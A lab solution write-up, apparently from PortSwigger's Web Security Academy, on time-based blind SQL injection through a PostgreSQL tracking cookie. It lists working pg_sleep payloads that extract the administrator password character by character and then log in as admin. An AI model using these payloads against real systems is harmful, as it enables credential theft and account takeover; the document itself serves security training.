## Blind SQL injection with time delays and information retrieval

**Category:** sqli
**Difficulty:** Medium

### Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The database is PostgreSQL.

### Solution Steps
1. Identify the injection point in the TrackingId cookie
2. Confirm time-based injection with: `x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
3. Response should delay ~10 seconds, confirming injection
4. Confirm administrator user exists:
5. `x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
6. Determine password length by incrementing N until no delay:
7. `x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>N)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
8. Extract password character by character using SUBSTRING:
9. `x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
10. 10-second delay = character is correct, no delay = wrong character
11. Iterate through positions (1,2,3...) and characters (a-z, 0-9)
12. Build full password and login as administrator

### Key Payloads
- `users`
- `username`
- `password`
- `administrator`
- `TrackingId`
- `pg_sleep(10)`
- `x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--`
- `x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
- `x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
- `x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`

### Indicators of Success
- 10-second delay confirms true conditions
- No delay confirms false conditions
- Password length determined by threshold testing
- Each character confirmed by delay response
- Full password enables admin login

---
*Source: PortSwigger Web Security Academy*
